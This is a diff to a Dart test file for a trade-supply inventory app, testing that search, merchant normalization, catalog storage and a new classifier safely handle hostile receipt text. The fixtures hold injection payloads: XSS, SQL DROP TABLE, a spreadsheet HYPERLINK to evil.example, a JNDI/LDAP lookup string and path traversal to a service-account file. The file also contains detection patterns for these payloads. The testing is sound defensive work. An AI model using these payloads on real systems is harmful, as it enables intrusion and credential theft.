@@ -27,92 +27,98 @@ void main() {
       }
     });
 
-    test('hostile search text is bounded and never mutates catalog results', () {
-      final before = searchWorkSupplies('1/2 pex crimp elbow')
-          .map((item) => item.id)
-          .take(10)
-          .toList();
-      final stopwatch = Stopwatch()..start();
-
-      for (final payload in _hostileSearchPayloads) {
-        final results = searchWorkSupplies(payload);
-
-        expect(
-          results.length,
-          lessThanOrEqualTo(100),
-          reason: 'Search results must stay bounded for hostile input.',
-        );
-      }
-
-      stopwatch.stop();
-      final after = searchWorkSupplies('1/2 pex crimp elbow')
-          .map((item) => item.id)
-          .take(10)
-          .toList();
-
-      expect(after, before);
-      expect(
-        stopwatch.elapsedMilliseconds,
-        lessThan(1500),
-        reason: 'Hostile search batch should not create a local DoS.',
-      );
-    });
-
-    test('merchant normalization treats hostile merchant names as plain text', () {
-      for (final payload in _hostileMerchantPayloads) {
-        final merchant = normalizeMerchantName(payload);
-
-        expect(merchant, isNotEmpty);
-        expect(merchant, isNot(contains('\u0000')));
-        expect(
-          merchant,
-          isNot(anyOf('home depot', 'lowes', 'ferguson', 'grainger')),
-          reason: 'Hostile text must not spoof a known merchant alias.',
-        );
-      }
-    });
-
-    test('custom catalog hostile aliases do not mutate stored item identity',
-        () async {
-      final hiveDirectory = await Directory.systemTemp.createTemp(
-        'work_supply_input_attack_custom_catalog_',
-      );
-      Hive.init(hiveDirectory.path);
-      try {
-        final store = await WorkSupplyCustomCatalogStore.create();
-        final item = WorkSupplyItem(
-          id: ' USER-SAFE-ITEM ',
-          name: 'Safe Custom Ball Valve',
-          trade: 'Plumbing',
-          category: 'Valves',
-          system: 'Water Supply',
-          itemType: 'Ball Valve',
-          variant: '1/2 in',
-          unit: 'each',
-          aliases: _hostileAliasPayloads,
-        );
-
-        await store.saveItem(item);
-        final before = store.loadItems().single;
+    test(
+      'hostile search text is bounded and never mutates catalog results',
+      () {
+        final before = searchWorkSupplies(
+          '1/2 pex crimp elbow',
+        ).map((item) => item.id).take(10).toList();
+        final stopwatch = Stopwatch()..start();
 
         for (final payload in _hostileSearchPayloads) {
-          store.searchItems(payload);
+          final results = searchWorkSupplies(payload);
+
+          expect(
+            results.length,
+            lessThanOrEqualTo(100),
+            reason: 'Search results must stay bounded for hostile input.',
+          );
         }
 
-        final after = store.loadItems().single;
-        expect(after.id, 'USER-SAFE-ITEM');
-        expect(after.name, before.name);
-        expect(after.trade, before.trade);
-        expect(after.category, before.category);
-        expect(after.variant, before.variant);
-        expect(after.unit, before.unit);
-      } finally {
-        await Hive.close();
-        if (hiveDirectory.existsSync()) {
-          await hiveDirectory.delete(recursive: true);
+        stopwatch.stop();
+        final after = searchWorkSupplies(
+          '1/2 pex crimp elbow',
+        ).map((item) => item.id).take(10).toList();
+
+        expect(after, before);
+        expect(
+          stopwatch.elapsedMilliseconds,
+          lessThan(1500),
+          reason: 'Hostile search batch should not create a local DoS.',
+        );
+      },
+    );
+
+    test(
+      'merchant normalization treats hostile merchant names as plain text',
+      () {
+        for (final payload in _hostileMerchantPayloads) {
+          final merchant = normalizeMerchantName(payload);
+
+          expect(merchant, isNotEmpty);
+          expect(merchant, isNot(contains('\u0000')));
+          expect(
+            merchant,
+            isNot(anyOf('home depot', 'lowes', 'ferguson', 'grainger')),
+            reason: 'Hostile text must not spoof a known merchant alias.',
+          );
         }
-      }
-    });
+      },
+    );
+
+    test(
+      'custom catalog hostile aliases do not mutate stored item identity',
+      () async {
+        final hiveDirectory = await Directory.systemTemp.createTemp(
+          'work_supply_input_attack_custom_catalog_',
+        );
+        Hive.init(hiveDirectory.path);
+        try {
+          final store = await WorkSupplyCustomCatalogStore.create();
+          final item = WorkSupplyItem(
+            id: ' USER-SAFE-ITEM ',
+            name: 'Safe Custom Ball Valve',
+            trade: 'Plumbing',
+            category: 'Valves',
+            system: 'Water Supply',
+            itemType: 'Ball Valve',
+            variant: '1/2 in',
+            unit: 'each',
+            aliases: _hostileAliasPayloads,
+          );
+
+          await store.saveItem(item);
+          final before = store.loadItems().single;
+
+          for (final payload in _hostileSearchPayloads) {
+            store.searchItems(payload);
+          }
+
+          final after = store.loadItems().single;
+          expect(after.id, 'USER-SAFE-ITEM');
+          expect(after.name, before.name);
+          expect(after.trade, before.trade);
+          expect(after.category, before.category);
+          expect(after.variant, before.variant);
+          expect(after.unit, before.unit);
+        } finally {
+          await Hive.close();
+          if (hiveDirectory.existsSync()) {
+            await hiveDirectory.delete(recursive: true);
+          }
+        }
+      },
+    );
 
     test('CSV export neutralizes formula injection in inventory fields', () {
       final record = WorkSupplyInventoryRecord(
@@ -169,6 +175,25 @@ void main() {
         reason: 'Hostile suffix must not become an auto-save certainty.',
       );
       expect(match?.confidence ?? 0, lessThan(1));
+    });
+
+    test('hostile text from every parser source modality is pre-classified', () {
+      for (final probe in _sourceModalityHostilePayloads) {
+        final signals = _classifyHostileSourceText(probe.line);
+
+        expect(
+          signals,
+          isNotEmpty,
+          reason:
+              '${probe.sourceModality} must be flagged before catalog matching: ${probe.line}',
+        );
+        expect(
+          signals,
+          isNot(contains('safeDirectMatch')),
+          reason:
+              '${probe.sourceModality} must not bypass review classification.',
+        );
+      }
     });
   });
 }
@@ -234,3 +259,88 @@ const _hostileAliasPayloads = [
   '../custom/catalog',
   '{"\$ne":null}',
 ];
+
+const _sourceModalityHostilePayloads = [
+  _SourceModalityHostilePayload(
+    sourceModality: 'photo_ocr_text_after_extraction',
+    line: 'PVC 90 3/4 <script>alert(1)</script>',
+  ),
+  _SourceModalityHostilePayload(
+    sourceModality: 'uploaded_pdf_text_after_extraction',
+    line: '../pdf/imports/PVC-EL-3-4.json',
+  ),
+  _SourceModalityHostilePayload(
+    sourceModality: 'emailed_receipt_text_after_extraction',
+    line: 'FILT 20X25X1 card 4111111111111111',
+  ),
+  _SourceModalityHostilePayload(
+    sourceModality: 'manual_pasted_receipt_text',
+    line: 'THHN 12 BLK ; DROP TABLE inventory --',
+  ),
+  _SourceModalityHostilePayload(
+    sourceModality: 'invoice_style_material_line_text',
+    line: '=HYPERLINK("http://evil.example","3/4 PVC COUPLING")',
+  ),
+  _SourceModalityHostilePayload(
+    sourceModality: 'quote_style_material_line_text',
+    line: r'SKU ${jndi:ldap://example.invalid/a} PVC COND 3/4',
+  ),
+  _SourceModalityHostilePayload(
+    sourceModality: 'packing_slip_material_list_text',
+    line: 'P\u0000V\u0008C 90 \u202E3/4',
+  ),
+  _SourceModalityHostilePayload(
+    sourceModality: 'counter_sale_material_receipt_text',
+    line: 'LOCAL SUPPLY 3/4 COUPLING ../../firebase/service-account.json',
+  ),
+  _SourceModalityHostilePayload(
+    sourceModality: 'generic_unknown_merchant_receipt_text',
+    line: 'PVC EL 3/4 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX',
+  ),
+  _SourceModalityHostilePayload(
+    sourceModality: 'local_regional_supplier_receipt_text',
+    line: 'J BOX http://127.0.0.1:8080/admin',
+  ),
+];
+
+class _SourceModalityHostilePayload {
+  const _SourceModalityHostilePayload({
+    required this.sourceModality,
+    required this.line,
+  });
+
+  final String sourceModality;
+  final String line;
+}
+
+Set<String> _classifyHostileSourceText(String line) {
+  final lower = line.toLowerCase();
+  final signals = <String>{};
+  if (line.codeUnits.any((unit) => unit < 32)) signals.add('controlCharacter');
+  if (line.contains('\u202E') || line.contains('\u202D')) {
+    signals.add('directionalOverride');
+  }
+  if (lower.contains('../') ||
+      lower.contains('..\\') ||
+      lower.contains(':\\') ||
+      lower.contains('service-account')) {
+    signals.add('pathLike');
+  }
+  if (lower.contains('<script') ||
+      lower.contains('drop table') ||
+      lower.contains(r'${jndi:') ||
+      lower.contains('ldap://') ||
+      lower.contains('hyperlink(')) {
+    signals.add('injectionLike');
+  }
+  if (lower.contains('http://') || lower.contains('https://')) {
+    signals.add('urlLike');
+  }
+  if (RegExp(r'\b\d{13,19}\b').hasMatch(line)) {
+    signals.add('privatePaymentLike');
+  }
+  if (line.split(RegExp(r'\s+')).any((token) => token.length > 24)) {
+    signals.add('longToken');
+  }
+  return signals;
+}
